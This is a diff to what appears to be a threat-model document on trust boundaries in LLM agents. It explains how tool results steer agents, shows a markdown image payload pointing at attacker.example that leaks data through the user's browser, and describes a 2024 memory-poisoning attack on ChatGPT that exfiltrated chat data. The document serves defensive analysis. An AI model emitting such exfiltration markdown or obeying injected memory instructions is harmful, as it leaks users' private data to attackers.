@@ -108,7 +108,7 @@ A **trust boundary** is any point where data or instructions move between princi
 
 The loop through B4 and B8 is what makes agents different from chatbots. The model's output crosses B8 as a tool call, the tool's result comes back across B4 into the context, and that result shapes the next output. One untrusted tool result can steer every later step.
 
-B7 is easy to miss. If the UI renders markdown, a model output containing `![x](https://attacker.example/?d=<data>)` causes the user's browser to request that URL, sending the data to the attacker without any tool call. Markdown image and link rendering has been the main real-world exfiltration channel in published LLM attacks.
+B7 is easy to miss. If the UI renders markdown, a model output containing `![x](https://attacker.example/?d=<data>)` causes the user's browser to request that URL, sending the data to the attacker without any tool call. Markdown image and link rendering is one of the most common exfiltration channels in published LLM attacks, including EchoLeak and SpAIware.
 
 Memory makes boundaries persistent. In September 2024 Johann Rehberger showed that untrusted content (a web page or document) could make ChatGPT store attacker instructions in its long-term memory. Those instructions then reloaded across B5 into every future conversation and exfiltrated chat data through rendered images (B7). OpenAI fixed the exfiltration channel. Rehberger noted that untrusted content could still write to memory.
 
